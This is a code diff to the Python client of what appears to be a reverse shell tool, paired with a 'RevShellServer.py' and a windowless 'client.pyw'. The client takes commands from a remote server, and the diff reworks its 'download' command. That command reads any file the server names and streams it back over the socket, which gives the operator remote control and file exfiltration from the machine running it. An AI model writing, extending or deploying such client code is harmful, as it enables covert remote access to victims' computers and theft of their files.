@@ -4,6 +4,7 @@ import socket
 import string
 import subprocess
 import sys
+import ctypes
 
 # THIS IS A DEBUG VERSION USE CLIENT.PYW INSTEAD 
 
@@ -23,20 +24,29 @@ while True:
     if cmd.lower() in ['q', 'quit', 'x', 'exit']:
         break
 
+    # This will close the connection
     if cmd.lower() in ['down', 'download']:
-        sep = '#SEP#'
-        file = s.recv(1024).decode()
-        file_size = os.path.getsize(file)
-        if sep in file:
-            print('Warning invalid filename')
-            exit(-1)
-        s.send(f'{file}{sep}{file_size}'.encode())
-        with open(file, 'rb') as f:
-            while True:
-                file_bytes = f.read(1024)
-                if not file_bytes:
-                    break
-                s.sendall(file_bytes)
+        yesNo = s.recv(1024).decode()
+        if yesNo == 'y':
+            print("\033c", end='')
+            sep = '#SEP#'
+            file = s.recv(1024).decode()
+            file_size = os.path.getsize(file)
+            if sep in file:
+                print('Warning invalid filename')
+                exit(-1)
+            s.send(f'{file}{sep}{file_size}'.encode())
+            with open(file, 'rb') as f:
+                while True:
+                    file_bytes = f.read(1024)
+                    if not file_bytes:
+                        break
+                    s.sendall(file_bytes)
+            print('Download complete closing...')
+            s.close()
+            sys.stderr = object
+        elif yesNo == 'n':
+            continue
         
     # To add your own command remove the # below and change alias with the command alias and command with the command name
     # Make sure to add it to RevShellServer.py as well
